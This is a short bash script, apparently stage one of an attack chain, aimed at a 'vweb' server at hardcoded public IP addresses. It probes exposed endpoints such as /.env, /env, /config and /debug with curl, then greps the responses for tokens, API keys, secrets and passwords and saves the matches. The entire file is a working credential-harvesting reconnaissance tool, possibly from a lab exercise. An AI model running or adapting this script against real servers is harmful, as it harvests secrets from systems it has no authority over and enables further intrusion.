#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

# : "${VWEB_HOST:=40.81.144.4}"
: "${VWEB_HOST:=51.143.216.192}"
: "${VWEB_PORT:=8000}"

mkdir -p logs
OUT=logs/discovered_from_vweb.txt
RAW=logs/vweb_scrape_raw.txt

CANDIDATES=(
  "/debug" "/status" "/config" "/vars" "/env" "/.env" "/_debug" "/info"
)

echo "=== [Stage1] Collecting possible leaked info from vweb ==="
: > "$RAW"
found=""

for path in "${CANDIDATES[@]}"; do
    url="http://${VWEB_HOST}:${VWEB_PORT}${path}"
    echo "[probe] $url"
    if curl -fsS "$url" >> "$RAW" 2>/dev/null; then
        echo "" >> "$RAW"
    fi
done

# try to match common keywords
if grep -Eiq '(token|secret|apikey|api_key|access[_-]?key|auth|credential|passwd|password)' "$RAW"; then
  echo "[extract] candidate lines:"
  grep -Ein '(token|secret|apikey|api_key|access[_-]?key|auth|credential|passwd|password)' "$RAW" | head -n 5 | tee "$OUT"
  found="yes"
fi

if [[ -z "$found" ]]; then
    echo "[warn] no obvious keys/tokens in vweb responses; saving raw scrape."
    echo "No obvious sensitive strings found." > "$OUT"
fi

echo "[stage1] raw saved to: $RAW"
echo "[stage1] extracted (if any) saved to: $OUT"
